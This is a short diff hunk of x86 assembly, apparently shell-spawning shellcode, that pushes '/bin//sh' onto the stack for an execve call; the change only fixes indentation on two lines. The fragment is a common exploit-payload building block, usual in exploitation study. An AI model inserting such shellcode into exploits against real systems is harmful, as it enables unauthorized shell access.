@@ -82,8 +82,8 @@ _start:
 
   ; execve("/bin//sh", ["/bin//sh"], 0)
   push edx
-	push dword 0x68732f2f
-	push dword 0x6e69622f
+  push dword 0x68732f2f
+  push dword 0x6e69622f
   mov ebx, esp
   push edx
   push ebx
